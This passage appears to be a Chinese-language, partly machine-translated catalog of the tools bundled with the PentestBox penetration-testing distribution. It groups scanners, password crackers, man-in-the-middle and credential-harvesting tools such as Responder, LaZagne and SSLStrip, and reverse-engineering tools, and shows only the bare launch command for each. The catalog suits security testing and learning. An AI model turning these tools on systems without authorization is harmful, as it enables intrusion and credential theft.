+<pre><code>C:\Users\Demon\Desktop
+&gt;burpsuite
+</code></pre><p><strong>Commix</strong>  有一个简单的环境,它可以被使用,从web开发人员,渗透测试人员甚至安全研究人员测试web应用程序的视图找到错误,错误或漏洞相关命令注入攻击。    </p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;commix
+</code></pre><p><strong>dotdotpwn</strong> 这是一个非常灵活的智能fuzzer发现遍历目录等软件的漏洞HTTP / FTP / TFTP服务器,网络平台如cms,erp,博客,等等。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;dotdotpwn
+</code></pre><p><strong>fimap</strong>  fimap有点python工具可以找到,准备、审计、利用甚至谷歌自动在webapps本地和远程文件包含漏洞。fimap应该像sqlmap LFI / RFI代替sql注入漏洞。这是目前正在发展但它是可用的。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;fimap
+</code></pre><p><strong>Golismero</strong>  GoLismero安全性测试的是一个开源框架。这是目前针对网络安全,但它可以很容易地扩展到其他类型的扫描。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;golismero
+</code></pre><p><strong>jSQL</strong>  jSQL注入是一个轻量级应用程序用于查找数据库信息从一个遥远的服务器。jSQL是免费的,开放源码和跨平台(Windows、Linux、Mac OS X、Solaris)。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;jSQL
+</code></pre><p><strong>Nikto</strong>  Nikto是一个开源的web服务器(GPL)扫描仪对web服务器执行全面测试多个项目,包括超过6700个有潜在危险的文件/程序,检查超过1250台服务器的过时的版本,和版本超过270服务器上的具体问题。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;nikto
+</code></pre><p><strong>PadBuster</strong>  自动化脚本执行Padding Oracle的攻击。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;padbuster
+</code></pre><p><strong>SqlMap</strong>  sqlmap是一个开源的渗透测试工具,自动检测和利用SQL注入漏洞的过程和接管的数据库服务器。它有一个强大的检测引擎,许多细分功能的最终渗透试验器和广泛的开关持续指纹数据库,从数据库获取数据,访问底层文件系统和操作系统上执行命令通过带外连接。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;sqlmap
+</code></pre><p><strong>Vega</strong> – Vega 是一个免费和开源的扫描仪和测试平台,测试web应用程序的安全。织女星可以帮助你找到并验证SQL注入、跨站脚本(XSS),不经意间透露敏感信息,和其他漏洞。它是用Java编写的,基于GUI的,运行在Linux上,OS X和窗户。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;vega
+</code></pre><p><strong>Wpscan</strong>—–WPScan是一个黑盒WordPress漏洞扫描器,可以用来扫描远程WordPress安装发现安全问题。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;wpscan
+</code></pre><p><strong>Yasuo</strong> – Yasuo是一个ruby脚本扫描脆弱的第三方web应用程序。工作时在网络安全评估(内部、外部redteam演出等),我们经常碰到脆弱的第三方web应用程序或web前端,让我们妥协远程服务器利用公开已知的漏洞。一些常见的和最喜欢的Apache Tomcat应用程序管理界面,JBoss jmx控制台</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;yasuo
+</code></pre><p><strong>Zaproxy</strong>– OWASP Zed攻击代理(攻击)是一个易于使用的综合渗透测试工具在web应用程序中寻找漏洞。是设计用于与广泛的安全经验的人,因此是理想的开发和功能测试人员是渗透测试作为一个有用的补充有经验的笔测试人员工具箱。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;zap
+</code></pre><p>6.2 Web应用程序代理</p>
+<p><strong>Burp Suite</strong> – Burp Suite是一个集成的平台进行安全性测试的web应用程序。它的各种工具无缝地协同工作,以支持整个测试过程,从最初的映射和分析应用程序的攻击表面,通过寻找和利用安全漏洞。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;burpsuite
+</code></pre><p><strong>Zaproxy</strong>- OWASP Zed攻击代理(攻击)是一个易于使用的综合渗透测试工具在web应用程序中寻找漏洞。是设计用于与广泛的安全经验的人,因此是理想的开发和功能测试人员是渗透测试作为一个有用的补充有经验的笔测试人员工具箱。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;zap
+</code></pre><p>6.3 CMS漏洞扫描器</p>
+<p><strong>CMSmap</strong>——CMSmap python开源CMS扫描,自动检测安全漏洞的过程中最受欢迎的CMS。CMSmap的主要目的是为不同类型的cms集成常见漏洞在一个单一的工具。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;cmsmap
+</code></pre><p><strong>droopescan</strong>——基于插件的扫描仪，帮助安全研究人员识别问题<br>Drupal。<br>SilverStripe<br>Wordpress</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;droopescan
+</code></pre><p><strong>OWASP</strong> Joomla漏洞扫描器——Joomla！ 它可能是最广泛使用的CMS，由于其灵活性，用户友好性，可扩展性命名一些。因此，观察其漏洞，并添加像KB这样的漏洞到Joomla扫描器需要持续的活动。它将帮助Web开发人员和Web 大师帮助识别他们部署的Joomla可能的安全弱点！ 网站。 没有Web安全扫描程序仅专用于一个CMS。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;joomscan
+</code></pre><p><strong>Wpscan</strong>———–WPScan是一个黑盒WordPress漏洞扫描器,可以用来扫描远程WordPress安装发现安全问题。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;wpscan
+</code></pre><p><strong>VbScan</strong>——VBScan perl编程语言是一个开源项目的检测链入页面CMS漏洞和分析。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;vbscan
+</code></pre><p>6.4 网络爬虫程序</p>
+<p><strong>DirBuster</strong>——DirBuster是一个多线程java应用程序，旨在强制在Web /应用程序服务器上强制目录和文件名。<br>作者:OWASP.org<br>许可:Apache 2.0</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;dirbuster
+</code></pre><p><strong>Burp Suite</strong> ——Burp Suite 是一个集成的平台进行安全性测试的web应用程序。它的各种工具无缝地协同工作,以支持整个测试过程,从最初的映射和分析应用程序的攻击表面,通过寻找和利用安全漏洞。<br>作者:Portswigger</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;burpsuite
+</code></pre><p>6.5 信息收集</p>
+<p><strong>Angry IP Scanner</strong> -Angry IP Scanner (或者只是ipscan)是一个开源和跨平台的网络扫描器设计为快速和易于使用。它扫描IP地址和端口,以及许多其他功能。人们普遍使用的网络管理员,只是好奇的世界各地的用户,包括大型和小型企业、银行和政府机构。</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;ipscan
+</code></pre><p><strong>dnsrecon</strong>– DNS枚举脚本<br>许可:GPLv2</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;dnsrecon
+</code></pre><p><strong>Golismero</strong>——GoLismero安全性测试的是一个开源框架。这是目前针对网络安全,但它可以很容易地扩展到其他类型的扫描。<br>许可:GPLv2</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;golismero
+</code></pre><p><strong>Instarecon</strong>自动化的基本数字侦察。伟大的目标获得最初的足迹,发现额外的子域。InstaRecon会做的事:<br>DNS(直接、PTR MX,NS)查找<br>域名查询服务(域和IP)查找<br>谷歌在搜索的子域狗屁不是<br>Shodan查找<br>在整个cidr反向DNS查找<br>许可:麻省理工学院的许可</p>
+<pre><code>C:\Users\Demon\Desktop
+&gt;instarecon
+</code></pre><p><strong>Nmap</strong>-Nmap(“网络映射器”)是一个免费和开源(许可证)实用程序用于网络发现和安全审计。许多系统和网络管理员也发现它有用的任务,比如网络库存,管理服务升级计划,和监控主机或服务正常运行时间。Nmap使用原始IP数据包在小说方面来确定网络上的主机可用,哪些服务(应用程序名称和版本)提供这些主机,操作系统(OS版本)他们正在运行,什么类型的数据包过滤器/防火墙正在使用,和几十个其他的特征。它旨在快速扫描大型网络,但对单一主机工作正常。Nmap运行在所有主要的电脑操作系统,和官方二进制包可供Linux,Windows,和Mac OS x除了经典Nmap命令行可执行文件,Nmap套件包括一个先进的GUI和结果查看器(Zenmap),一个灵活的数据传输,重定向,和调试工具(Ncat),比较扫描结果的一个实用程序(Ndiff)和数据包生成和响应分析工具(np)。<br>许可:GPLv2</p>
+<p>为了使用Nmap，你需要首先安装WinPcap包捕获库，可以从Winpcap.org下载。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;nmap
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;ncat
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;ndiff
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;nping
+</code></pre><p><strong>Responder</strong> –Responder 是一个LLMNR NBT-NS和mdn投毒者,内置HTTP / SMB /该软件/ FTP / LDAP流氓身份验证服务器支持NTLMv1 / NTLMv2 / LMv2,延长安全NTLMSSP和HTTP基本身份验证。<br>作者:SpiderLabs<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;responder
+</code></pre><p><strong>SnmpWalk</strong>——SnmpWalk允许你检测一组变量可用于某一设备上阅读。你可以获得一个完整的列表或部分。通过分析网络设备扫描获得的结果使用SnmpWalk可以开发一个支持的mib列表,通过这种方式,获得完整的描述变量和可能的值。<br>作者:SnmpSoft公司</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;snmpwalk
+</code></pre><p><strong>SpiderFoot</strong>——SpiderFoot是一个开源情报自动化工具。它的目标是实现自动化的过程对给定目标收集情报,这可能是一个IP地址,域名、主机名或网络子网。SpiderFoot可以用来进攻,即作为黑盒的一部分渗透测试收集的信息目标或防守来识别你的组织是免费提供什么信息对你攻击者使用。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;spiderfoot
+</code></pre><p><strong>TestSSLServer</strong>——TestSSLServer是一个简单的命令行工具,联系一个SSL / TLS服务器(名称和端口给出参数),获得一些信息。<br>作者:托马斯Pornin</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;testsslserver
+</code></pre><p><strong>SSlStrip</strong>——它将透明地劫持HTTP交通网络上,注意HTTPS连接和重定向,然后这些链接映射到类似的HTTP链接或homograph-similar HTTPS连接。它还支持模式提供一个看起来像一个锁图标标识,选择性伐木、否认和会话。<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;sslstrip
+</code></pre><p><strong>SSLyze</strong>——SSLyze是一个Python工具,可以分析一个服务器的SSL配置连接到它。设计为快速和全面的,应该帮助组织和测试人员识别SSL服务器配置错误影响他们。<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;sslyze
+</code></pre><p><strong>SSLScan</strong>——SSLScan测试SSL / TLS启用服务发现支持密码套件。<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;sslscan
+</code></pre><p><strong>Sublist3r</strong>——Sublist3r是python工具,旨在列举子域的网站使用搜索引擎。它有助于渗透测试和bug猎人收集和收集他们的目标域的子域。Sublist3r目前支持以下搜索引擎:谷歌,雅虎,必应,百度,问。更多的搜索引擎可能被添加在未来。使用Netcraft和DNSdumpster Sublist3r也收集子域。<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;sublist3r
+</code></pre><p><strong>Subbrute</strong>SubBrute是一个社区驱动的项目的目标创造最快的和最精确的子域名枚举的工具。背后的一些魔法SubBrute是它使用解析器作为一种开放代理绕过DNS病原。这个设计还提供了一层匿名,SubBrute不直接发送交通目标的名字服务器。<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;subbrute
+</code></pre><p><strong>Tekdefense</strong>-Automater-自动化是一个URL /域名,IP地址和Md5 hash OSINT工具旨在使分析过程更容易入侵分析师。给定一个目标(URL、IP或散列)或一个文件全自动化目标将返回相关的结果来源如下:IPvoid.com,Robtex.com,Fortiguard.com,unshorten。我,Urlvoid.com,Labs.alienvault.com,ThreatExpert VxVault,VirusTotal。<br>作者:TekDefense.com</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;automater
+</code></pre><p><strong>UrlCrazy</strong>——生成和测试域输入错误和变化检测和执行错误蹲,URL劫持,钓鱼,和企业间谍活动。</p>
+<p>许可:非商业性</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;urlcrazy
+</code></pre><p><strong>The Harvester</strong> ——The Harvester 电子邮件帐户,子域名名称、虚拟主机、开放端口/横幅,和员工的名字从不同的公共资源(搜索引擎,pgp关键服务器)。<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;theharvester
+</code></pre><p><strong>Wireshark</strong>——Wireshark是世界上最重要的网络协议分析仪。它让你看到发生了什么在您的网络在微观水平。这是事实上的标准(通常法理)在许多行业和教育机构。Wireshark发展繁荣的贡献全球网络专家。<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;wireshark
+</code></pre><p>6.6 开发工具</p>
+<p><strong>Beef Project</strong>——beef是浏览器开发框架。这是一个渗透测试工具,它关注的是web浏览器。<br>作者:Wade Alcorn<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;beefproject
+</code></pre><p><strong>CrackMapExec</strong>-其中的瑞士军刀Windows /活动目录环境。<br>多亏了托马斯。编译的版本。<br>作者:byt3bl33d3r</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;crackmapexec
+</code></pre><p><strong>Metasploit</strong> Framework——世界上最好用渗透测试框架。<br>作者:Rapid7<br>许可:BSD 3条款许可协议<br>请注意PentestBox的有两个版本,一个与Metasploit Metasploit和另一个。如果没有完成下载Metasploit变体在这里。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;msfvenom
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;msfelfscan
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;msfbinscan
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;msfpescan
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;msfd
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;msfmachscan
+</code></pre><p><strong>SqlMap</strong>——sqlmap是一个开源的渗透测试工具,自动检测和利用SQL注入漏洞的过程和接管的数据库服务器。它有一个强大的检测引擎,许多细分功能的最终渗透试验器和广泛的开关持续指纹数据库,从数据库获取数据,访问底层文件系统和操作系统上执行命令通过带外连接。<br>作者:Miroslav Stampar Bernardo Damele Assumpcao吉马良斯<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+</code></pre><p>6.7 密码破解<br><strong>Burp Suite</strong>——Burp Suite是一个集成的平台进行安全性测试的web应用程序。它的各种工具无缝地协同工作,以支持整个测试过程,从最初的映射和分析应用程序的攻击表面,通过寻找和利用安全漏洞。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;burpsuite
+</code></pre><p><strong>Findmyhash</strong>——findmyhash。py尝试不同类型的裂缝散列使用免费的在线服务。<br>作者:JulGor<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;findmyhash
+</code></pre><p><strong>HashIdentifier</strong>——软件来识别不同类型的散列加密数据,尤其是密码使用。<br>作者:Zion3R<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;hashidentifier
+</code></pre><p><strong>Hashcat</strong>——Hashcat是世界上最快的CPU-based密码恢复工具。<br>许可证</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;hashcat-cli32
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;hashcat-cli64
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;hashcat-cliXOP
+</code></pre><p><strong>LaZagne</strong>——LaZagne项目是一个开放源码应用程序用于检索大量的密码存储在本地计算机。每个软件存储密码使用不同的技术(明文、api、自定义算法、数据库等)。这个工具已经开发为目的的找到这些密码为最常用的软件。这时,它支持22个项目在使用微软的Windows操作系统和12在Linux /类unix操作系统。<br>作者:AlessandroZ<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;lazagne
+</code></pre><p><strong>John the Ripper</strong>——John the Ripper是一个快速密码饼干,目前对于许多风格的Unix,窗户,DOS,BeOS和OpenVMS。它的主要目的是检测弱Unix密码。除了在各种Unix系统上最常见的几种crypt（3）密码哈希类型，支持开箱即用的是Windows LM hash，以及社区增强版本中的大量其他哈希和密码。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;johntheripper
+</code></pre><p><strong>Patator</strong>——Patator是出于对使用Hydra，Medusa，Ncrack，Metasploit模块和Nmap NSE脚本的密码猜测攻击的挫折。 我选择了不同的方法，以便不创建另一个暴力的工具，并避免重复相同的缺点。 Patator是一个用Python编写的多线程工具，力求比其他前辈更可靠和更灵活。<br>作者:Sebastien MACKE<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;patator
+</code></pre><p><strong>RainbowCrack</strong>——RainbowCrack是Philippe Oechslin更快的时间存储器权衡技术的一般建议实现。 它裂纹散列与彩虹表.RainbowCrack使用时间内存权衡算法来破解哈希。 它不同于强力哈希饼干。强力哈希饼干生成所有可能的明文，并在飞行中计算相应的哈希，然后将哈希与要破解的哈希进行比较。 一旦找到匹配，找到明文。 如果所有可能的明文都被测试并且没有找到匹配，则找不到明文。 利用这种类型的散列破解，丢弃所有中间计算结果。<br>作者:RainbowCrack项目</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;rcrack
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;rt2rtc
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;rtgen
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;rtsort
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;rcrack_cl
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;rcrack_cl_gui
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;rcrack_cuda
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;rcrack_cuda_gui
+</code></pre><p><strong>THC Hydra</strong>– Hydra是一个并行登录饼干支持众多的协议攻击。非常快和灵活,很容易添加新的模块。这个工具可以让研究人员和安全顾问展示将是多么容易获得未授权访问远程系统。<br>请注意,PentestBox包含编译的版本THC-Hydra来自在这里.<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;hydra
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;pw-inspector
+</code></pre><p><strong>Zaproxy</strong>– OWASP Zed攻击代理(攻击)是一个易于使用的综合渗透测试工具在web应用程序中寻找漏洞。是设计用于与广泛的安全经验的人,因此是理想的开发和功能测试人员是渗透测试作为一个有用的补充有经验的笔测试人员工具箱。<br>作者:Simon Bennetts</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;zap
+</code></pre><p>6.8 安卓系统安全</p>
+<p><strong>AndroBugs Framework</strong> -—AndroBugs Android脆弱性分析框架是一个系统,有助于开发人员或黑客在Android应用程序找到潜在的安全漏洞。没有灿烂的GUI界面,但最有效的(平均每扫描不到2分钟)和更准确。<br>作者:AndroBugs<br>作者:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;androbugs
+</code></pre><p>Androguard逆向工程,恶意软件和goodware Android应用程序的分析……和更多(忍者!)<br>作者: Anthony Desnos<br>许可:Apache版本2.0</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;androapkinfo
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;androarsc
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;androauto
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;androaxml
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;androcsign
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;androdd
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;androdiff
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;androdis
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;androgui
+</code></pre><p><strong>Androwarn</strong>——Androwarn是一个工具,它的主要目的是对潜在的恶意行为检测和警告用户开发的Android应用程序。<br>作者: Thomas D<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;androwarn
+</code></pre><p><strong>ApkTool</strong>逆向工程第三方的工具,关闭,二进制Android应用程序。它可以解码资源接近原始形式和重建后做一些修改,这使得有可能逐步调试smali代码。还使用一个应用程序就会变得容易些,因为项目的文件结构和自动化等重复性的任务构建apk,等等。<br>作者:Connor Tumbleson, Ryszard Wiśniewski<br>许可:Apache版本</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;apktool
+</code></pre><p><strong>ByteCode Viewer</strong> ——反向工程第三方，封闭，二进制Android应用程序的工具。 它可以将资源解码为几乎原始的形式，并在做出一些修改后重建它们; 它使得可以一步一步地调试smali代码。 此外，它使一个应用程序的工作更容易，因为像项目一样的文件结构和自动化一些重复的任务，如构建apk等。<br>作者:konloch<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;bytecodeviewer
+</code></pre><p><strong>dex2jar</strong>——转换。dex文件。类文件(压缩jar)<br>作者:鲍勃·潘<br>许可:Apache版本</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;d2j-dex2jar
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;d2j-dex2smali
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;d2j-jar2dex
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;d2j-decrypt-string
+</code></pre><p><strong>Jad</strong>x——敏捷的Java编译器<br>作者:skylot<br>许可:Apache</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;jadx
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;jadx-gui
+</code></pre><p><strong>JD-GUI</strong>——JD-GUI是一个独立的图形工具显示的Java源代码”。阶级”文件。你可以浏览重建源代码JD-GUI即时访问方法和字段。<br>许可:免费非商业用途</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;jd-gui
+</code></pre><p><strong>Pidca</strong>t——彩色logcat脚本,只显示了一个特定的应用程序包的日志条目。<br>作者 Jake Wharton</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;pidcat
+</code></pre><p>6.9 逆向工程<br><strong>ApkTool</strong>—-逆向工程第三方的工具,关闭,二进制Android应用程序。它可以解码资源接近原始形式和重建后做一些修改,这使得有可能逐步调试smali代码。还使用一个应用程序就会变得容易些,因为项目的文件结构和自动化等重复性的任务构建apk,等等。<br>作者:Connor Tumbleson, Ryszard Wiśniewski<br>许可:Apache版本</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;apktool
+</code></pre><p><strong>dex2jar</strong>——转换。dex文件。类文件(压缩jar)<br>作者:Bob Pan<br>许可:Apache版本</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;d2j-dex2jar
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;d2j-dex2smali
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;d2j-jar2dex
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;d2j-decrypt-string
+</code></pre><p><strong>Jad</strong> —— Jad provides提供了一个命令行用户界面从类文件中提取源代码。<br>作者: Pavel Kouznetsov</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;jad
+</code></pre><p><strong>JD-GUI</strong>——JD-GUI是一个独立的图形工具显示的Java源代码”。阶级”文件。你可以浏览重建源代码JD-GUI即时访问方法和字段。<br>许可:免费非商业用途</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;jd-gui
+</code></pre><p><strong>JavaSnoop</strong>——JavaSnoop是安全工具,它允许一个方面安全测试人员轻松地测试Java应用程序的安全。<br>作者:www.aspectsecurity.com<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+</code></pre><p><strong>OllyDbg</strong>——OllyDbg 32位汇编级别分析调试器为Microsoft®Windows®<br>作者:Oleh pokalchuk Yuschuk</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;ollydbg
+</code></pre><p><strong>Radare2</strong>——r2是从头开始的重写，以提供一组库和工具来处理二进制文件.Radare项目作为取证工具启动，脚本命令行十六进制编辑器能够打开磁盘文件，但后来支持分析二进制文件， 反汇编代码，调试程序，附加到远程gdb服务器。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;radare2
+</code></pre><p>打开网络服务器,请遵循下面。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;radare2directory
+
+C:\PentestBox\bin\ReverseEngineering\radare2
+$radare2.exe - c = H rax2.exe
+</code></pre><p><strong>Smali/Baksmali </strong>-=smali / baksmali是dalvik使用的dex格式的汇编/反汇编器，Android的Java VM实现。 语法是松散地基于Jasmin的/ dedexer的语法，并支持dex格式的完整功能（注释，调试信息，行信息等）。您可以通过键入smali和baksmali访问smali和baksmali<br>许可:BSD</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;smali
+
+cmd.exe
+C:\Users\Demon\Desktop
+&gt;baksmali
+</code></pre><p>6.10 压力测试</p>
+<p><strong>THC-SSL-DOS</strong>——THC-SSL-DOS工具是一个概念证明披露可疑SSL的安全工具。这工作好如果服务器支持SSL重新谈判。它仍然工作如果不支持SSL重新谈判,但之前需要一些修改和更多的机器人可以看到产生影响。<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+</code></pre><p>6.11 嗅探<br><strong>Burp Suite</strong> ——Burp Suite 是一个集成的平台进行安全性测试的web应用程序。它的各种工具无缝地协同工作,以支持整个测试过程,从最初的映射和分析应用程序的攻击表面,通过寻找和利用安全漏洞。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;burpsuite
+</code></pre><p><strong>DNSChe</strong>f——DNSChef是一个高度可配置DNS代理渗透测试人员和恶意软件分析师。DNS代理(又名“假DNS”)是一个工具用于应用程序的网络流量分析等用途。例如,可以使用DNS代理伪造请求“badguy.com”指向一个本地机器终止或拦截,而不是一个真正的主机在互联网上的某个地方。<br>作者:thesprawl<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;dnschef
+</code></pre><p><strong>Ettercap</strong>——Ettercap是一套综合的中间人攻击。它嗅探的实时连接,动态内容过滤和其他许多有趣的把戏。它支持主动和被动解剖的许多协议和包括许多功能网络和主机的分析。<br>许可:GPLv2</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;ettercap
+</code></pre><p><strong>ngrep</strong>——ngrep pcap-aware工具将允许您指定扩展正则表达式匹配的数据包有效载荷数据。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;ngrep
+</code></pre><p><strong>Network Miner</strong> ——NetworkMiner可以用作被动网络嗅探器/数据包捕获工具，以便检测操作系统，会话，主机名，开放端口等，而不在网络上引入任何流量。 NetworkMiner还可以解析PCAP文件进行离线分析，并从PCAP文件重新生成/重新组合传输的文件和证书。<br>作者:NETRESEC</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;networkminer
+</code></pre><p><strong>Responder</strong>— Responder 是LLMNR，NBT-NS和MDNS中毒程序，内置支持NTLMv1 / NTLMv2 / LMv2，扩展安全性NTLMSSP和基本HTTP身份验证的HTTP / SMB / MSSQL / FTP / LDAP流氓认证服务器。<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;responder
+</code></pre><p><strong>SSlStrip</strong>——它将透明地劫持网络上的HTTP流量，监视HTTPS链接和重定向，然后将这些链接映射到类似于HTTP的链接或同源图类似的HTTPS链接。 它还支持提供图标的模式，看起来像一个锁图标，选择性日志记录和会话拒绝。<br>许可:GPLv3</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;sslstrip
+</code></pre><p><strong>WinDump</strong>——WinDump tcpdump的Windows版本,UNIX命令行网络分析仪。WinDump完全兼容tcpdump和可以用来观察,诊断并保存到磁盘网络流量根据各种复杂的规则。<br>许可:BSD</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;windump
+</code></pre><p><strong>Wireshark</strong>——Wireshark – Wireshark是世界上最重要的网络协议分析器。 它可以让你看到你的网络在微观层面上发生了什么。 它是许多行业和教育机构的事实上（并通常是法律上的）标准。 Wireshark的发展蓬勃发展得益于全球网络专家的贡献。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;wireshark
+</code></pre><p><strong>Zaproxy</strong>– OWASP Zed攻击代理(攻击)是一个易于使用的综合渗透测试工具在web应用程序中寻找漏洞。是设计用于与广泛的安全经验的人,因此是理想的开发和功能测试人员是渗透测试作为一个有用的补充有经验的笔测试人员工具箱。</p>
+<pre><code>cmd.exe
+C:\Users\Demon\Desktop
+&gt;zap
+</code></pre><p>6.12 取证工具<br><strong>Bulk Extractor</strong>——bulk_extractor是一种计算机取证工具，用于扫描磁盘映像，文件或文件目录，并提取有用信息而无需解析文件系统或文件系统结构。 可以使用自动化工具轻松检查，解析或处理结果。 bulk_extractor还创建了它找到的特征的直方图，因为更常见的特征往往更重要。 该程序可用于执法，国防，情报和网络调查应用程序。<br>作者:Simson l·加芬克尔<br>许可:GPLv2</p>
